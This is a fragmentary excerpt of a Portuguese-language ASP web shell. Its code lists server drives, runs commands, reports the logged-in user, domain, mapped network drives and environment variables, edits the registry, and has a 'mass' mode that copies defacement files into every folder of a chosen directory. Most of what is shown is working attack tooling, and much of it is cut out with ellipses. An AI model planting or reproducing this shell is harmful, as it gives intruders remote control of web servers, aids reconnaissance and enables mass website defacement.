...
Sub showcontent()
	...
	If Trim(Request.QueryString("raiz")) = "root" Then
		...
		For Each drive IN drivecollection 
			...
			response.write "-<br>"
			End If
			Response.Write "<b>Espao Livre: </b>"
			If drive.isready Then
			...
			Else
				response.write("-<br>")
			End If
			Response.Write "<b>Espao Total: </b>"
			If drive.isready Then
...
Select Case Trim(Request.QueryString("action"))
	...
	Case "ren"
		...
		End If
	Case "error"
		Response.Write "<center><font face='arial' size='2' color='red'> <b>CDIGO CORROMPIDO<BR>CORRUPT CODE</font></center>"
	Case "cmd"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
	...
	Case "info"
		...
		Response.Write "<b>IDENTIFICAO DE REDE:</b><br>"
		Response.Write "<b>Usurio: </b>" & WshNetwork.UserName & "<br>"
		Response.Write "<b>Nome do Computador: </b>" & WshNetwork.ComputerName & "<br>"
		Response.Write "<b>Usurio do Domnio: </b>" & WshNetwork.UserDomain & "<br>"
		Set Drives = WshNetwork.EnumNetworkDrives
		For i = 0 to Drives.Count - 1
			Response.Write "<b>Drive de Rede (Mapeado): </b>" & Drives.Item(i) & "<br>"
		Next
		Response.Write "<br><b>FSICO:</b><br>"
		Response.Write "<b>Arquitetura do Processador: </b>" & WshEnv("PROCESSOR_ARCHITECTURE") & "<br>"
		Response.Write "<b>Nmero de Processadores: </b>" & WshEnv("NUMBER_OF_PROCESSORS") & "<br>"
		Response.Write "<b>Identificador do Processador: </b>" & WshEnv("PROCESSOR_IDENTIFIER") & "<br>"
		Response.Write "<b>Nvel do Processador: </b>" & WshEnv("PROCESSOR_LEVEL") & "<br>"
		Response.Write "<b>Reviso do Processador: </b>" & WshEnv("PROCESSOR_REVISION") & "<br>"
		Response.Write "<br><b>LGICO:</b><br>"
		...
		Response.Write "<b>Especificao do Command: </b>" & WshShell.ExpandEnvironmentStrings("%ComSpec%") & "<br>"
		Response.Write "<b>Caminhos no Path: </b>" & WshEnv("PATH") & "<br>"
		Response.Write "<b>Executveis: </b>" & WshEnv("PATHEXT") & "<br>"
	...
	Case "reg"
		...
		Select Case Trim(Request.QueryString("regaction"))
			Case "w"
				...
				Else
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">ROOT KEY NAME</td><td><font face=""arial"" size=""2"">ABREVIAO</td></tr>"
					...
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">Tipo </td><td><font face=""arial"" size=""2""> Descrio </td><td><font face=""arial"" size=""2""> Na forma de </td></tr>"
					...
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_DWORD </td><td><font face=""arial"" size=""1""> nmero </td><td><font face=""arial"" size=""1""> inteiro </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_BINARY </td><td><font face=""arial"" size=""1""> valor binrio </td><td><font face=""arial"" size=""1""> VBArray de inteiros </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_EXPAND_SZ </td><td><font face=""arial"" size=""1""> string expandvel (ex. ""%windir%\\calc.exe"") </td><td><font face=""arial"" size=""1""> string </td></tr>"
	...
	Case "mass"
		...
		Sub brutemass(caminho,massaction)
			...
			Else
				If Request.Form.Count = 0 Then
					Response.Write "<font face=""arial"" size=""2""><br><br><b>Brute:</b> copia os arquivos do deface para todas as pastas e subpastas (todos os nveis) do diretrio escolhido (mais demorado). O tempo do deface vai variar de acordo com o numero TOTAL de diretrios.<br><br>"
					Response.Write "<b>Single:</b> copia os arquivos do deface apenas para as pastas (primeiro nvel) do diretrio escolhido. No inclui subpastas.<br><br>"
					...
					Response.Write "<center><font face=""arial"" size=""2"">Insira o cdigo:<br>"
...
End Select
If Err.Number <> 0 Then
	Response.Write "<br><font face='arial' size='2'>ERRO: " & Err.Number & "<br><br><b>" & UCase(Err.Description) & "</b><br>Acesse o <b>ONLINE HELP</b> para a explicao do erro"
End If
